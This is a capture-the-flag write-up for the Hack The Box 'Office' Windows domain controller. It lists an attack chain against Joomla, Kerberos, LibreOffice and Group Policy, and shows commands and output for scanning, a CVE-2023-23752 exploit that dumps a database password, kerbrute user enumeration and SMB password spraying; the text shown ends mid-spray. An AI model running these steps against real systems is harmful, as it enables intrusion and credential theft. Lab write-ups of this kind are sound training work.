# HTB - Office

### TL;DR
This is a Windows Server 2022 machine running as DC of domain `office.htb`. It is hosting a web site made with Joomla 4.2.7 CMS which is vulnerable to CVE-2023-23752. Exploiting this vulnerability we are able to dump a password from the MySQL database, and running a `kerbrute` attack we can retrieve a list of domain usernames. Spraying these credentials we get access to an SMB share that stores a Wireshark `.pcap` which contains a Kerberos `AS-REQ` frame. Inside the frame there is hash that can be cracked to find the Joomla administrator password. A low-priv shell is gained by uploading a `.php` shell in Joomla templates. Finally, user flag is retreived moving laterally to user `office\tstark`.<br>
<br>
Regarding privilege escalation, first we need to move laterally to user `office\ppotts` by uploading a malicious `.odt` that exploits a Libre Office vulnerability (CVE-2023-2255). Then move laterally to user `office\hhogan` by decrypting DPAPI vault credentials with Mimikatz. Finally, system privileges are gained abusing a permisive GPO.

### KEYWORDS
Joomla, CVE-2023-23752, Kerbrute, Wireshark, `AS-REQ`, Libre Office, CVE-2023-2255, lateral movement, Mimikatz, GPO aubuse.

### REFERENCES
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla<br>
https://www.cvedetails.com/cve/CVE-2023-23752<br>
https://github.com/0xNahim/CVE-2023-23752<br>
https://github.com/elweth-sec/CVE-2023-2255<br>
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials<br>
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials<br>
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1<br>
https://github.com/byronkg/SharpGPOAbuse<br>
https://github.com/FSecureLABS/SharpGPOAbuse<br>
<br>

### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason

Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-18 05:42 EST
Nmap scan report for 10.10.11.3
Host is up, received user-set (0.15s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
443/tcp   open  https            syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
55119/tcp open  unknown          syn-ack
58534/tcp open  unknown          syn-ack

Nmap done: 1 IP address (1 host up) scanned in 70.93 seconds
```
Looks like a domain controller, enumerate the open ports.
```markdown
> nmap $target -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 -sV -sC -Pn -vv

Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-18 05:55 EST
Nmap scan report for 10.10.11.3
Host is up, received user-set (0.11s latency).
Scanned at 2024-02-18 05:55:03 EST for 93s

PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
80/tcp   open  http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
| http-robots.txt: 16 disallowed entries 
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-18 18:55:53Z)
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
| SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
443/tcp  open  ssl/http      syn-ack Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
| SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_http-title: 400 Bad Request
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
| SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
| SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
| SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        syn-ack .NET Message Framing
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m43s
| smb2-time: 
|   date: 2024-02-18T18:56:37
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45891/tcp): CLEAN (Timeout)
|   Check 2 (port 15731/tcp): CLEAN (Timeout)
|   Check 3 (port 58167/udp): CLEAN (Timeout)
|   Check 4 (port 52719/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 95.36 seconds
```
Enumerate the DNS.
```markdown
> nslookup

> server 10.10.11.3
Default server: 10.10.11.3
Address: 10.10.11.3#53
> office.htb
Server:         10.10.11.3
Address:        10.10.11.3#53

Name:   office.htb
Address: 10.250.0.30
Name:   office.htb
Address: 10.10.11.3
> dc.office.htb
Server:         10.10.11.3
Address:        10.10.11.3#53

Name:   dc.office.htb
Address: 10.10.11.3
```
Add to `/etc/hosts` and enumerate the `robots.txt` file (http://office.htb/robots.txt).
```markdown
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
Navigate to http://office.htb/administrator, a Joomla CMS login page comes into view.

![office Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c8a21a01-8c17-41c8-b274-1bd1132c8c8e)

Investigate ways to pentest Joomla here: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla<br>
<br>
They explain how to enumerate the current Joomla version. Vy navigating to http://office.htb/administrator/manifests/files/joomla.xml you can verify the running version is 4.2.7.

![office Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/176158c1-35d9-4843-9061-e4d492468d81)

At this point we have everything we need to start the exploitation phase. In summary, we have found an Active Directory domain controller running a website made with Joomla CMS 4.2.7.

### USER
Searching for Joomla 4.2.7 vulnerabilities, we come across this one: https://www.cvedetails.com/cve/CVE-2023-23752. And this POC allows to dump MySQL secrets from Joomla websites: https://github.com/0xNahim/CVE-2023-23752<br>
<br>
Run the exploit against the host and retrieve MySQL root credentials.
```markdown
> python3 exploit.py -u http://office.htb

[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users
Site info
Sitename:Holography Industries
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: root
DB password: H0lOgrams4reTakIng0Ver754!
DB name: joomla_db
DB prefix: if2tx_
DB encryption: 0
```
We have a password, now we need a list of usernames to spray it. For this, launch a `kerbrute` attack.
```markdown
> kerbrute userenum --dc office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
After a while, a list of usernames is dumped by the tool.
```markdown
administrator@office.htb
Administrator@office.htb
etower@office.htb
ewhite@office.htb
dwolfe@office.htb
dlanor@office.htb
dmichael@office.htb
hhogan@office.htb
DWOLFE@office.htb
DLANOR@office.htb
tstark@office.htb
```
Let's spray the password we previously found in SMB with the username list.
```markdown
> crackmapexec smb office.htb -d office -u ./userlist -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success

SMB         10.10.11.3      445    DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:office) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [-] office\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
